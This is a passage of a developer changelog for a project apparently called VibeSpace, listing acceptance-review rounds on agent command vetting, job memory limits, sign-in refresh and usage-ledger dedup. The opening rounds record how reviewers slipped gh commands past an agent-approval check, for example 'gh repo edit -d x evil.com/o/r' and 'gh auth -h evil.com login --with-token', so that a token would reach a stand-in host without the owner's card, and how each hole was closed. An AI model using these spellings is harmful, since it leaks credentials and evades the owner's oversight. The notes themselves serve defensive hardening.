- **Acceptance round 4 (主开发's delta review of round 3 — a FOURTH commit on `0e1056ee`; one BLOCKER regression, two MAJORs, one MINOR×2, plus docs):** (1) BLOCKER — round 3's `repoSpecSubs` read only `repo clone|fork|view|sync`, so `gh repo delete|edit|archive|unarchive|set-default HOST/OWNER/REPO` fell to the default hosts and ran with no card (gh builds the client for that host and sends GH_ENTERPRISE_TOKEN there): the row now lists every `gh repo <verb>` whose first positional is `<…repository>` (archive / clone / delete / edit / fork / set-default / sync / unarchive / view), derived from gh's own grammar and PINNED against `gh repo --help` in the suite (⑤c — a verb the help lists and the row lacks is red). (2) MAJOR — `conninfoUriBlind` only saw a bare argv word, so `--dbname=<URI>` / `-d<URI>` / `--dbn=<URI>` carrying `?%68ostaddr=` stayed ok:own: the URI is now read wherever libpq reads it — a `-d` / `--dbname` value (attached / `=` / GNU prefix) as well as a bare word. (3) MAJOR — `blindFlagSubs` matched the raw stored token, so `-dm` / `-md` / `-d=true` / `--delete-branch=true` / `--push=true` / `--clone=true` / `repo create -c` slipped: `boolFlagOn` canonicalises every pflag spelling before the lookup (long, `=true` but not `=false`, a short alone, a short in a cluster, `-x=true`) and the row lists each short alias (`-c` = --clone, `-d` = --delete-branch). (4) MINOR×2 — the `$VAULT_FILE{…}` file-flag exception keyed on the placeholder and was a substring test: `fileFlagExempt` now admits only a WHOLE `$VAULT_FILE{…}` value (for `-E`/`--cert` an optional `:password`) whose entry the agent did not author — an owner-store entry; a `--file NAME=@template`, an agent-put `agent:<own>/…` entry, or a substring (`./x/$VAULT_FILE{o}/ca.pem`, `$VAULT_FILE{o}/../ca.pem`) is the agent's own file ⇒ blind (stricter than the letter of the rule — a minted own value, never a usable cert, blinds too). Each item flips a base-`0e1056ee` source copy (20 cases → ask / blind; 4 controls hold on both). Accepted by name, extended: `~/.wgetrc`, `~/.config/httpie/config.json`, `~/.config/gh/config.yml` (http_unix_socket), `~/.my.cnf`, `~/.curlrc`, `~/.netrc`, gh ALIASES (`gh alias set x '!…'` is a shell; `'api …'` re-dispatches); `gh run download` writes files but drives no git (accepted); `gh gist clone` is the git-driving class (accepted — a fresh clone runs no project hooks). Gates: test-vault-run-model 120 (+ the round-4 rows, the ⑤c gh-grammar pin, 5 RED mutants), the vault family green, fast tier green.
- **Acceptance round 5 (主开发's delta review of round 4 — a FIFTH commit on `9e9fa855`; two MAJORs with ONE root cause + two minors):** round 4's `repoSpecSubs` / `blindFlagSubs` were HAND-KEPT lists and gh's flags are PER VERB, so two holes remained. (1) MAJOR — a gh VALUE flag the row did not list, placed BEFORE the `<repository>` positional, was read as the spec so the host fell to the defaults and ran with no card while gh resolved the repo at evil.com (`gh repo edit -d x evil.com/o/r` where `-d`=--description; `gh repo view -b main evil.com/o/r` where `-b`=--branch). (2) MAJOR — `boolFlagOn` bound a short cluster's `=value` to EVERY letter, but pflag binds it to the LAST letter only, so `gh pr merge -dm=false` / `-ds=false -m` / `gh repo create -cd=false --public` set the git-driving bool TRUE (the `=false` went to another letter) while the model ran ok:own. THE FIX (the registry law — one table derived from its source, a census that fails a drift): the gh grammar is GENERATED from gh's own `--help` per verb by `scripts/gen-gh-grammar.mjs` (value flags long+short, bool flags, the `<…repository>` positional shape, the `--hostname` short) and shipped as a literal in the gh row; shapeOf reads it (a value flag consumes its argument in any spelling; a `spec` verb reads `positionals[0]` as HOST/OWNER/REPO, scheme stripped; `-h`=`--hostname` per verb; a cluster's `=value` binds to the LAST letter only). ⑤c became the CENSUS: it re-runs the same parse against the live gh across the shipped groups and diffs — a verb / value flag / bool / positional shape / hostname short drift is RED by name; a SKIP changes the suite's total (`ALL PASS (125, gh grammar census: 22 verbs)` vs `(124 + 1 SKIP: gh absent)`), and on the gate (CI ships gh) a SKIP is red; a per-verb `--help` failure is a ✗ by name. The generated table caught host-reaching verbs the hand-kept list never had — `skill install` / `skill preview` and `label clone` read their `<repository>` host now, and `gh auth status|refresh|token -h evil.com` reads the host (`-h`=`--hostname` under auth); `gh repo delete https://evil.com/o/r` strips the scheme. MINOR — the kb said «an agent-put entry» blinds as a file flag; the rule blinds ANY agent-scoped placeholder (a MINTED own value too, a minted value being random printable text, never a usable cert/key/CA) — now said in both kb lines and the `fileFlagExempt` words. Each item flips a base-`9e9fa855` source copy (9 flips → ask / blind; 4 controls hold on both). Gates: test-vault-run-model 125 (+ the round-5 rows, the ⑤c gh-grammar census, 6 RED mutants), the vault family green, fast tier green.
- **Acceptance round 6 (主开发's delta review of round 5 — a SIXTH commit on `d32a2d91`; FAIL CLOSED, stop modelling cobra):** round 5 modelled cobra's parse, and the skeptics reordered the words until the invariant fell again. (1) BLOCKER — a VALUE flag (or `-R`) placed BEFORE the verb words dropped the per-verb grammar (the pre-scan stopped at the first dash) and ran with no card while cobra skipped the flag + its arg at every level and re-parsed at the leaf (`gh repo -d x edit evil.com/o/r`, `gh -d x repo edit …`, `gh auth -h evil.com login --with-token`); `gh --branch=main repo view …` was a strict regression vs 9e9f. (2) MAJOR — an UNKNOWN verb (or one absent from the shipped groups) fell OPEN on the defaults. (3) MAJOR — a repository-TYPEd value (`gh repo create x --template evil.com/o/r`) and repo create's `<name>` positional (`gh repo create evil.com/o/r`, parsed by ghrepo.FromFullName) were read as plain values. THE LAW: the reader reads ONLY the spellings it can read with certainty and BLINDS the rest of a known network tool. ### jobs-memory-bound — a Background Work job carries a memory bound and a NAMED end; an OOM counts toward the park and is never restarted blindly (F6 of B-7f9e)
- **Cause:** the fleet pod's cgroup has `memory.oom.group=1` (the forensics of userQ's instance, 2026-10-27: 638 restarts in 74 h — an admin exec that time); nothing bounded a job, `jobs.js`'s `oom` cause was dead code, and a run that died with the pod (no exit.json — the wrapper dies too) was replayed by every boot, never counted.
- **Measured:** a user-systemd scope without `--collect`, OOMPolicy=stop ⇒ `Result=oom-kill` + `MemoryPeak` survive the kill (the cgroup dir does not); the scoped child keeps the wrapper's process group; fleet image 3.7.0 = prlimit (util-linux 2.38.1), no systemd; node 24 needs > 512 MB of RLIMIT_DATA to start (V8 CodeRange), node 22 starts under 512 MB.
- **Built:** PURE ladder / verdict / rung record / park law / boot judge (src/job-model.js); the wrapper measures + confirms the rung (cgroup › rlimit-data › none + why), names the end (oom-bound / oom), samples pressure; the engine names, counts (sweep, boot adopt, boot env-restart), parks (a cron child parks its parent); setting `jobs.memoryMb`, chart `jobs.memoryMb` → `VIBESPACE_JOBS_MEMORY_MB`; the card's chip + named end + properties row (zh/ja); `vibespace-job run --memory` / `memory <id>`.
- Gates: test-jobs-memory 65 (base 6428c67e: 8 / 57 — the 512 MB job ends exit 0, a boot replays blind); the job suites, test-spend-paths, the record-clear / peer-text censuses (rows), test-helm-render, test-ci-gate (fast 909.63 / 910 s: the four real legs run at once, 0.4 s).
- **Round 2 (acceptance):** a rung is PROVEN before it is claimed — a sh gate on fd 3 runs the job only after the scope's memory.max / its RLIMIT_DATA was read back, and a refused or silent manager falls to the next rung (systemd < 253 refused `OOMPolicy=` and every job died, by cgroup); OOMPolicy only ≥ 253, below it the scope's own memory.events via a hold; ONE road of the park law (`_countEnd`: the boot's env-restart resets); the boot judge reads the same cgroup's OOM count and ANON memory (page cache is never pressure); the refusal keyed on the CODE (node 24.22: ERR_MEMORY_ALLOCATION_FAILED); no hub-subtree counter; «512k» refused by name; the properties field exact. test-jobs-memory 111 under node 24.12 / 24.22 / 22.22 (0259f1ea: 66 / 45, under 24.22 55 / 56); test-sync-fs-census jobs.js 47; fast 909.73 / 910 s (0.5 s).
- **Round 4 (acceptance):** a stop ends the JOB — the < 253 HOLD (the job's parent: the group's SIGTERM killed it and the wrapper left the job running, the engine's SIGKILL gated on the dead wrapper) is gone: the gate execs the job on every rung, a double-forked KEEPER beside it holds the scope for memory.events (a POSIX sh cannot forward faithfully: a background job starts with SIGINT/SIGQUIT ignored for good, `set -m` needs a tty — measured); the scope is the group: the stop said to it, exit.json only once its cgroup.procs is empty (10 s, then killed — «stopped by force»); the engine's kill step kills the scope by `cgroup.kill` whatever the wrapper's state, a dead wrapper's scope is reaped (sweep, boot). A proof's timer is its rung's (`prove(r, c, deadline)`). The properties field shows the STORED value, «effective 6 GB · the instance’s limit 8 GB» beside it. The cgroup rung's cap is what its scope SHARES with the hub (read off the scope, set before the go); the record names which limit (`memoryCap.of`). test-jobs-memory 143 under node 24.12 / 24.22 / 22.22 (222f7f5d: 120 / 23).
- **Round 3 (micro):** the EFFECTIVE bound = min(the asked, the instance's own memory.max less the hub's share max(1 GiB, 25 %)) — a 16 GB job on an 8 GiB pod runs at 6 GiB; the run / snapshot / `setMemory` carry `memoryAskedMb` + `memoryCap`; the card, the CLI, the properties toast and the journal say «capped by the instance's 8 GB limit»; the setting's description says so (zh/ja). test-jobs-memory 122 under node 24.12 / 24.22 / 22.22 (8a2727c8: 110 / 12).
- **Round 5 (acceptance, on b8d2a3a0):** one judge per run end — `_finalizeRun` returns for an ended run, `_sweep` is never re-entered (a tick finds the pass in flight and skips, said once past three), a scope's cgroup.procs read is bounded at 2 s (`_scopeProcs`; past it the run is judged from exit.json and the reap retried) — the reviewer's df2 repro on real ticks: finalizeCalls 2 → 1, parked → not; test-jobs-memory's cap row asserts the engine's own answer (red on any uncapped host — 142/1 — it was green only inside env.sh's 24 GiB scope); a stop's grace is the stop's own (the sweep no longer kills 0–5 s in; the engine's scope kill is a backstop one second after the wrapper's; the force says its bound); what a task leaves running is stopped and said, a service keeps it until its next start or stop (`_clearKept`, `_startAfter` — the boot replay awaits its predecessor's reap); `forced` vs `scopeEmpty`; an unbounded scope's words. test-jobs-memory 168 (b8d2a3a0: 140/28).
- **Round 6 (acceptance, on ef0012b5):** a reap that did not finish is ALWAYS retried — it enqueues itself (`_reapLater`) whoever started it (the boot dropped its answer: a task's, a cron child's or a non-replayed service's old scope kept its processes for ever, unsaid), every tick retries it whatever the job's state, AT ONCE (a pass waits one bounded read — round 5 awaited each scope in series), 12 tries then said once; past the read's bound the run's own scope is killed blind (one cgroup.kill write per run in flight — a late answer is still ours, said by the attempt that sees it); `_killScope` has two words for two outcomes (a scope gone is not «no cgroup.kill»). A KILL TIMER BELONGS TO ITS RUN (`_armKillStep`: it fires only while that run runs, the next spawn disarms it — ef0012b5 SIGKILLed a service started again inside the grace and labelled it «stopped by force»); the engine's step is a backstop a second after the grace on every rung — on a pod the WRAPPER drains its own group at a stop as at an end (a SIGTERM-deaf member survived the stop for ever, unsaid), a stopped service's leftovers recorded the way an end records them and stopped with it. THE RECORD SAYS WHAT IT COULD NOT SEE: a setsid escapee is found by the job's mark in /proc/*/environ (`left.escaped` — a task's said, not stopped; a service keeps it). The keeper is known by the PID its gate says on fd 3, never its command line; a pod service's clear re-reads its group at clear time (a child forked after the record; «64 of 70 recorded»); a kept scope's stop under a held read SIGTERMs blind what the run recorded; every service start goes through `_startAfter` (`_pending`); an OOM the exit record names beats a stop pressed after it; «kept» words say when they were stopped («— stopped at 14:05»). test-jobs-memory split by the tier rule: fast (PURE + the engine in-process over a fake cgroup tree, nothing spawned — 0.3 s; ef0012b5 RED 90/18) + heavy test-jobs-memory-scopes (the real legs, every scope named for ITS run — two copies at once green, ef0012b5's staggered pair red 1 + 5; ef0012b5 RED 81/12); fast sum 909.53 of 910 s.
- **Round 7 (acceptance, on 336761e5):** THE LADDER runs every tick — a stop's, a timeout's and an until-marker's SIGTERM (`_termRun`, `_termAt`), then while that run lives `_escalate` each tick: the scope's kill once, a wedged wrapper with its group WEDGE_MS later (round 6 armed the timeout's step once: a wrapper wedged after the scope's kill was never killed, the task «up» for ever — probe-timeout [SIGTERM, scope] → [SIGTERM, scope, SIGKILL], the real-process probe ends «timeout»). A scope is reaped only for a wrapper PROVEN gone (`_wrapperUnproven`: an unreadable pid.json blind-killed a LIVE service at a boot whose read hung — now deferred and said; read alive, nothing reaped and no run beside it, `_besideLive`). ONE deadline per reap attempt, a kill in flight inspected never re-awaited (K = 6 hung scopes: a retry pass 4.00 s → 2.00 s). The engine writes a stop's INTENT (`stop.json`) before its signal and the wrapper reads it at its end (a service's leftovers were kept, unsaid, when the child's end ran before the wrapper's handler); heavy ⑭ kills on the wrapper's own «stop:» line inside a 1 s grace (two copies 0.25 s apart ×5: 10 of 10 green; 336761e5 red 4 of 5). Minors: a pod stop signals a service's escapees with the main (their own grace); a dropped reap says why (no read / refused + errno / survived + count); «had already ended» instead of «stopped at» when nothing ran; `PI.membersOf` bounded by rows and time, what it could not read said; the stop bullet and manual §7b scoped (a detached process that clears its environment is beyond what VibeSpace can see); the card's advice once. test-jobs-memory 121 (336761e5 108/13), test-jobs-memory-scopes 95 (91/4).
- **Round 8 (acceptance, on the chain rebased onto master 90c995a3 — r7's tip 95e882fd):** ONE CLOCK — the wrapper's drain on a pod's rung ends at `stopAt + stopMs` for every process (round 7's per-process deadline ran to 2× the grace, past the engine's kill step: the wrapper killed mid-drain, no exit.json, a stopped service's escapee alive for ever); what is first seen late gets what is left and is counted (`left.short`, «N processes got less than the full grace»); killed and rescanned until a pass finds none. WHO SIGNALLED WHOM — a signal beside a fresh intent is the engine's (members not signalled twice), any other the wrapper sends on to its group, an intent nobody delivered the wrapper delivers (exit.json `stopBy`). UNKNOWN BLOCKS A SPAWN — `_runDoubt` / `_doubtBlocks`: the replay, the restart policy and a person's start never start beside a run proven neither gone nor alive (round 7's `_besideLive` read the same unreadable stamp: a second run beside the live one); said once, ONE For-you notice; ended by a readable stamp, its scope read empty, or the person's stop (`_stopDoubt`). A CUT SCAN PROVES NOTHING — `membersOf({first})` scans the record's pids and their children first, outside the bound, the rest newest first; a cut ⇒ no `gone`, the start held. Gates: fast test-jobs-memory 129 (e7147b71 117 / 12), heavy test-jobs-memory-scopes 100 in ~12 s (e7147b71 94 / 6).

### lark-refresh-stall — a Lark sign-in is never lost to a hub stall; a lost answer is said as itself; a landed consent ends the dead row (BUILD lane on 2.369.359 6428c67e, the chain rebased onto 2.369.360 90c995a3 at acceptance r3; the owner's hub 2026-10-26 13:34 PT + 2026-10-27 19:17 PT, re-authorized 20:57:33 PT)

Now `liveDeadline` (20 s of RUNNING loop time, a 1 s monotonic tick; a late tick never fires) + undici's own timers (tick-counted in undici 7.16).
- **R2 the lost answer:** `detail.lost` + `heldMs` ⇒ `refreshLostAt` on the token ⇒ one try of the same token ⇒ a refusal is `refresh-lost` (new SIGNIN_CAUSES row) with its stall, never `revoked-elsewhere`; a request that never left (ECONNREFUSED & co.) records nothing.
- **R3 early:** REFRESH_MARGIN_MS 60 s → 15 min (the tenant token keeps 60 s as TENANT_MARGIN_MS); the pass calls `auth.renew()` (exposed by the registry's auth wrapper); a retryable refresh failure while the bearer lives serves it and pauses the refresh 60 s (REFRESH_RETRY_MS) — without it, the early margin would have turned a 5xx on the refresh into a failed pass 15 min before anything expired.

The English key says «its single-use refresh token» (test-architecture §83: no vendor name in a shared channel file).
- **R5 the landing:** onAuthDone / applyRebind retract the dead sign-in at a landed consent (revising channel-reauth-visible's «only a passing pass»); lane lark-signin-dialog's c80a27e4 is carried as its own commit underneath (the dialog's half).
- **Acceptance r2 (on 60e29ad0):** the pause re-reads the store (a Disconnect in flight ⇒ refused by name `disconnected`; a re-authorize ⇒ the store's new bearer; never one in its last 60 s); «never left» is the request's own fact (undici's `request:create` in the caller's AsyncLocalStorage + `client:sendHeaders`; a fetch undici never saw: a connect / getaddrinfo syscall); the tick accounting counts a gap ≥ 1.5 ticks' EXCESS as held and fires on a late tick past 20 s live; the consent's code exchange carries the live bound; lifetimes count from the send; renew() runs past the back-off gate, never in the bearer's last minute, a dead refusal there takes the ladder; any non-dead refresh refusal pauses; the words are measured-only (units s/min/h/days, vendor-free, a `disk` cause only from the loop-blame witness, `ut-item-wraps`), a words param's params refused by name; a landing VERIFIES (`landSignin`, `refused-at-first-use`); the 11-permissions row drops only what the list lacks and a dead token's list is not subtracted; the dialog re-reads on reconnect and asks before Escape ends a running sign-in; test-channels-engine's pinned producer line (the r1 BLOCKER: never run).

### ledger-dedup-law — a re-emission costs zero bytes; the hub keeps the device cursor; a refused background subject is ONE standing item; an out-of-shape shard is said and paused; a stepped one-shot dedup (B-7f9e, a fleet instance of userQ's measured 2026-10-26)
- **Cause (the forensics):** the usage harvest committed the device cursor with a `files` act the hub-act gate held for an owner who never answered, so every harvest re-sent the window since 2026-10-22, and `ingestRemoteEvents` appended it again (read-time dedup only) — one shard 1 → 23.8 GiB, ≥ 95 % repeats; an outside probe that read it whole took the 32 Gi container down (638 restarts); 958 of 1000 For-you slots were expired cards; the memory notice said «node».
- **F1** write-time dedup against the ingest's own per-shard rid index (inline ≤ 8 MiB, else stepped while the batch is deferred) + the batch's Set; `{appended, duplicates}`. **F2** the hub keeps the cursor (`_host-cursors/<host>.json`, written after the appends; agentd `usage-scan` takes it on stdin — capability `usage-scan-hub-cursor`); no device-side write; an older daemon ⇒ `since-unsupported` once, F1 keeps none of its re-read. **F3** a background subject's card is one standing item (no end, the consequence named, later refusals `ask_standing` counted in place; a boot keeps it); the For-you cap evicts the unanswered first. **F4** a shard over 2 GiB or (from 64 MiB) over 2× its distinct rids pauses the machine's ingest, files one notice, runs the dedup, resumes by itself; `/api/usage-stats` `ingestPaused`. **F5** the memory notice names the largest process by pid + command-line head (sysinfo `cmdlineHead`) and «an exec from outside the container». **Tail** the sync ledger load reads 1 MiB slices; no takeover of a warm past 8 MiB. **M** `2026-10-usage-ledger-dedup` — the runner records a promise-returning migration when it ends; streaming dedup by rid, first row kept, tmp renamed in, stepped ≤ 40 ms a turn (80 MB / 300 k rows in 437 ms, the longest turn 68 ms).
- Gates: test-ledger-dedup-law (new, fast — `38 FAILED (1 passed)` on 6428c67e), test-migrations, test-hub-act-ask (the background leg now pins the standing law), test-usage-scan-op (the real daemon walks the hub's cursor), test-sysinfo-op, test-usage-walk-parity, test-ctx-sync, test-spend-paths, test-architecture, the fast tier.

### ledger-dedup-law round 17 — a set that reads loses its mark at once; the live generation is decided first (B-7f9e, the acceptance of 14f0647b)
- **MAJOR — a set that read kept its mark while a segment failed the hold (an r16 regression):** r16 moved the live set's unmark out of `_holdRead` (r15: right after `_readSet`) into `_holdLoad`, which a hold that cannot be read whole never reaches. A set that read while a segment failed kept its earlier-start mark (on disk and in `_unreadMarks`), so its next EIO was judged «twice» by `_setVerdict`: on a flapping mount it was moved aside unread as «the disk's answer», its 3 dropped events «not known» (b553b51b kept it: gone 3). - **7 — the loop law:** the hold's every file call past its one listing runs on its async road (fs.promises) — one job at a time per hold, awaited by the ingest (its answer a promise then; both roads await it; the push road acks a seq once every chunk landed), bounded (`hold-slow` 30 s, said at 10 s, `hold-busy` at 8 jobs). Stays sync: the one listing per process, the ledger's own appends, the ingest index's reads. timedSync arms its name before the call; the witness's watchdog line names the store. Measured: 353 B a held row, 47.1 B a dropped rid (64 MiB ≈ 190 000 rows; a 10⁵-row set 4.5 MiB, 10⁶ → 45 MiB).

### ledger-dedup-law round 7 — the disk never says «dropped» about a row memory still holds; a drained row leaves the segment it was read from; a retirement is recorded before the unlinks; a torn append is known in-process (the acceptance of 4f42eaa3)
- **1 — the set file was ahead of memory (MAJOR, a round-6 regression):** the set's line was appended before the rows ⇒ a rows append that threw (ENOSPC) left the set naming live, acked segments, and a restart's crash-survivor rule deleted them (20 acked → 8 recorded; the re-sent window's `back` landed without its rows — 15 neither held nor counted). **Fix:** usage-history `_holdAppend` = the rows (`_holdWrite`), then the set's lines naming only what landed (`gone`, `back`, `below` — every segment under it is done: the crash survivor named, never guessed from its rows), then the unlinks.
- **2 — a drained row counted dropped (MAJOR, regression):** `_drainStep` never pruned drained rids and the bound counted drained bytes ⇒ a harvest mid-drain pushed the draining segment out: 40 said for 36 missing. **Fix:** drained rids leave `seg.rids` at each step, the bound counts `bytes − at`; ledger-shape-notice `redrop` re-says the count a hold ended with before `resumed` closes its item.
- **3 — a torn set append (MINOR, regression):** `goneTorn` was set only at the read-back ⇒ the next line glued to the fragment, 4 rows counted nowhere. **Fix:** `_holdWrite` cuts an append that threw back (`_holdCut`, a truncate); a set line that fails cuts the rows back too; a cut that fails too is known in-process (`_holdTorn` / `_goneTorn`, the set rewritten at the next append); the read-back counts whole lines only (`rowStart`); a file an append created and could not finish is unlinked, and a generation read back with no live row is retired silently.
- **4 — a drained generation read back as live (MINOR, R1's statement wider than its code):** **Fix:** `{"retired":gen}` before a hold's last unlink (and `below` when a drained segment's unlink fails); the read-back unlinks a retired generation unread, newer one or not.
- **5 — e5:** `_heldOnDisk` throws on a non-ENOENT listing error, never cached; the ingest answers `holdFailed` (unacked) until a listing succeeds. **e3:** a rotation past `HOLD_GEN_SPAN` is refused loudly (`hold-seq-bound`). **a3:** the listing sweeps `<gen>.dropped.tmp`. **z2:** the compaction bound is 4× the set (`dropBytesOf`), at the read-back too. **c / d:** the dedup laws written in kb-api. kb-file-structure's «THE FOLD WORKERS AT EXIT» bold restored.
- **6 — the twin tag flipped on an open item:** **Fix:** the moving-list law — a tag is sticky while its item is open; a twin tags the new item and, once, the open ones without one; `relabel` stores the bare `name`.
- Census: test-sync-fs-census usage-history 31 → 28 (one unlink site, one append site, + the cut's truncate and stat), mount-reader §86 27 → 28 (that stat); timed-sync `usage-held.write` sites = `_holdWrite`, `_dropCompact`.
- Gates: test-ledger-whole-law ⑰ ⑱ (`14 FAILED (85 passed)` on 4f42eaa3, `23 FAILED (76 passed)` on d2ff4026, 99/99 here), test-ledger-dedup-law, test-hub-act-ask, test-usage-events-push, test-sync-fs-census, test-exit-reach, test-user-todos-layout, test-decision-inbox, test-migrations, test-spend-paths, test-architecture, test-ci-gate, the build from a clean archive of the commit.

### ledger-dedup-law round 6 — a count is idempotent for a cut batch too; a notice is keyed, never matched by its words; a test kills what it spawned on every path (the acceptance of d2ff4026)
- **1 — the dropped count inflated on a re-send:** the cut entry was keyed by POSITION (`c<seq>@<offset>`) and a dropped segment's rids were forgotten ⇒ a window over the hold's bound re-sent by an older daemon was held again while still counted, each re-send pushing out a segment counted again (30 → 125 «never recorded» for 30 sent; the segment road 48 → 96). **Fix:** usage-history `h.gone` = the Set of the dropped rows' rids in `_held/<month>~<host>.<gen>.dropped` (`gone` / `back` lines before the rows and the unlinks; `_dropCompact`); a re-sent dropped row is held again only where the append fits without dropping another (it leaves the set), else it stays dropped, counted once, never re-written (`again` → `duplicates`); the crash survivor named by its rows; the r4/r5 markers and HOLD_ENTRY_BYTES gone.
- **R1 — a stale hold named the new one's rows:** a drained hold whose unlink failed (EBUSY) restarted the next hold's numbers at 0 and the read-back dropped the new segments (0/8 recorded). **Fix:** the hold's generation in its segments' numbers (`gen × 10⁶ + i`, `_holdGenNext` past every generation seen); the read-back reads the newest generation only (older segments unlinked, other set files `_dropStale`d); `_holdRetire` ends a hold and its set file.
- **2 — two machines of one name shared ONE notice:** the first filing went through user-todos `add()`'s text match. **Fix:** user-todos `add({itemKey})` — matched by (sessionKey, itemKey), the id derived (`_idOfKey`); ledger-shape-notice files with `itemKey: host id × file`, two open notices of one name carry the host id's short form (`twinsOf`, `relabel`, `shortHost`); the first detail line carries `month`.
- **3 — the push suite leaked its daemons on a failure path:** one `cleanup()` (each daemon by its pid, every scratch dir) on the process's `exit` and on SIGINT / SIGTERM / SIGHUP.
- Gates: test-ledger-whole-law ⑮ ⑯ + ⑫ re-derived (`13 FAILED (72 passed)` on d2ff4026, 85/85 here), the push suite under an injected throw (2 daemons alive + 1 scratch dir on d2ff4026, 0 + 0 here) and plain (11/11), test-ledger-dedup-law, test-hub-act-ask, test-architecture, test-ci-gate, the touched fast suites, the build from a clean archive of the commit.

### ledger-dedup-law round 5 — the ack is durability on every road; a Deny is readable before the first act; a resume follows a drain; a dropped count is a set (the acceptance of ff094d46)
- **MAJOR 1 — the push road refused whole:** server.js acked a usage-events push only without `paused`, and the ingest said `paused` whenever any month was out of shape ⇒ a November push beside a proven-over October never acked, the daemon re-sent the window at every transcript change. **Fix:** PURE usage-history `ackOf(answer)` — acked when every row is appended, a duplicate or held; not when deferred or a month's hold failed (`holdFailed: [{month, shard, error}]`); server.js returns `usageAckOf(r)`, the harvest road commits the hub cursor on `answer.ack`. The answer adds `pausedMonths` and `ack`.
- **MAJOR 2 — a Deny lost before the boot reconcile:** the subject's act re-filed the standing item and user-todos `add()` REOPENED the denied item (same ask id + words) 3 s before the reconcile read the Deny back. **Fix:** hub-act-ask `restoreStanding()` at `create()` (open + denied standing items, synchronously from the store), `check()` → `storedSubject(dk)` for a subject with no entry, the Deny's fact `decidedBy: 'person'`; user-todos `add()` never reopens a decided item (`decided: true`), `setStatus`/`setStatusMany` drop the mark (`undecide`).
- **MINORs:** the drain FIRST (`_resume` → `_drainHold` → `_drained` → `_resumed`; `_drainFailed` keeps `drain-failed`, retried at the machine's every ingest and at boot — `restorePause` keeps a back-in-shape month with a hold on disk, `restoreHolds` drains it); ONE notice per (host, file) — `itemOf`, re-worded in place via `reshapeItems`, a read one reopened, `resumed` closes it whatever its text; `holdError` per shard; the dropped count a SET (`h.gone`, the whole set in every marker, written before the unlink; a crash survivor unlinked uncounted at the read-back). kb-api's harvest answer rewritten (the r1/r2 shape was still documented).
- Gates: test-usage-events-push (the push road vs a REAL daemon, server.js's handler from source: `FAIL (3)` on ff094d46, 11/11 here; the suite now stops its daemons by pid), test-ledger-whole-law ⑬ ⑭ + ⑥ re-derived (`16 FAILED (57 passed)` on ff094d46, 73/73 here), test-ledger-dedup-law, test-hub-act-ask, test-migrations, test-spend-paths, test-architecture, test-ci-gate, the touched fast suites, the build from a clean archive of the commit.

### ledger-dedup-law round 4 — a pause is per shard (machine × month), never the machine; a batch is never refused whole (the acceptance of 4e94e377)
- **What 主开发 ruled (on round 3's own flag):** a proven-over October paused the HOST and refused every batch holding an October row whole — that machine recorded nothing in November either.
- **Fix:** usage-history splits the batch by month; a month out of shape (or with held rows still waiting) is HELD in `data/usage-history/_held/<month>~<host>.<seq>.ndjson` (≤ 64 MiB per machine × month in 16 MiB segments; past it the oldest segment goes, its rows COUNTED — a marker line keeps the count; timedSync `usage-held.write`), the other months append (`_appendRemote`, the ingest's and the drain's one append), the hub's cursor moves past the whole batch (not when a hold could not be written). The pause is keyed host × shard; its record adds month / held / dropped / holdMax and is re-said when a count moves. Back in shape (the machine's every ingest re-judges its paused months; `_rejudge`; `_afterDedup`; `restoreHolds` at boot) ⇒ `_drainHold`: the held rows in order through the ledger law, inline when small, else a slice per turn with the month's new rows queued behind. The notice is one per machine × month («Usage of M for YYYY-MM is held …», `D_HELD` / `D_DROPPED`), the Usage window adds `pausedHeld` / `pausedDropped`; zh + ja.
- Gates: test-ledger-whole-law ⑫ (new) + ⑤ ⑦ ⑪ re-derived (`12 FAILED (44 passed)` on 4e94e377, 56/56 here), test-ledger-dedup-law ④ re-derived (`3 FAILED (40 passed)` on 4e94e377, 43/43 here), test-hub-act-ask, test-migrations, test-architecture (§86 +1), test-sync-fs-census (+2), test-timed-sync, test-ci-gate, test-changelog-style, the build from a clean archive of the commit.

### ledger-dedup-law round 3 — consent is per subject on every road (the join too); the remedy and the boot judge say only what they know (the acceptance of d9753fa8)
- **What round 2's acceptance (11 agents) found:** the three MAJOR fixes held; left: ① a background act still JOINED a person's / an agent's card of the same machine × kind — a DENIED harvest went on the owner's Allow of an agent, and a harvest that went that way left its standing item open (probed); ② `_remedy`'s «proven» check was blind to the inode — a proven file rewritten under a new inode stayed paused for `size` with no remedy, state `none`, under «the repeated rows are being removed»; ③ the boot reconcile judged an exact-ratio notice by the sample, closed it, and the next ingest reopened it (a flap at every restart); ④ an `ids` pause ran a full-shard dedup at every backoff, each removing 0, under «rows were removed».
- **Fixes:** hub-act-ask keys EVERY act by `subjectKey` (one card per subject, no join); a Deny holds through the quiet window, a silent week, a Never and a restart (`resolvedFact.denied` on the item, read back by `reconcile`), lifted only by the owner allowing that subject or the list / the setting; the card's and the standing item's words name whose acts they cover. usage-history `_isProven` (by inode) shared by the verdict and the remedy; a shard over the bound is out of shape even when proven (round 1's exception reversed by the brief); a completed rewrite proves the new inode; `_remedyStops` (`proven-over`, `ids`: no run, no retry, said once); `REMEDY_STATES` with a row in the notice's `D_NOW` and the Usage window's `PAUSED_WORDS` for each; the notice carries `why` + `exact` and `restorePause` judges by them — an index-judged pause is `judging` until the ingest index is read after the warm (`_judgeByIndex` → `_rejudge`).
- Gates: test-ledger-whole-law ⑧–⑪ (`13 FAILED (34 passed)` on d9753fa8, 47/47 here), test-hub-act-ask (the first leg and the deny leg re-derived — `9 FAILED (83 passed)` on d9753fa8, 92/92 here), test-ledger-dedup-law 42/42, test-approval-census (the hub-act row: one card per subject), test-migrations, test-spend-paths, test-architecture, test-ci-gate, the build from a clean archive.

### human-cli — the person's CLI: list, attach, talk with NO hub (the owner after the 89-minute hub freeze of 2026-10-27)
- **The door:** `data/bin/vibespace` — `ls` / `status` / `attach` / `chat` for a person at the machine; the OPPOSITE of the agent CLIs (no hub, no token). Installed by the hub at every boot beside the index on the machine's own disk (`<place>/bin/`, a CLI under data/ hangs with data/); in AGENT_TOOLS with its PURE half (a paired device answers «no VibeSpace hub has run here» with the door).
- **The index:** `<home>/.vibespace/local/sessions.json` (PURE `src/local-index.js` place ladder: never a network/FUSE mount; parity with fd-budget `mountOf` + mount-path-class `NET_FSTYPE`), ONE writer `src/server/local-index.js` fed by `broadcastActiveSessions` + attach + boot + stop; sync tmp+rename (the threadpool was the frozen thing), 0600/0700, coalesced 250 ms + a 30 s heartbeat; closed rows; two hubs one home / throwaway rules.
- **The judge:** kernel facts now (a socket connect in a child with a 2 s clock; pid + birth from /proc) — the hub's word never decides; `status` = ONE 2 s HTTP ask + a data/ stat in a child + the unit's journal.
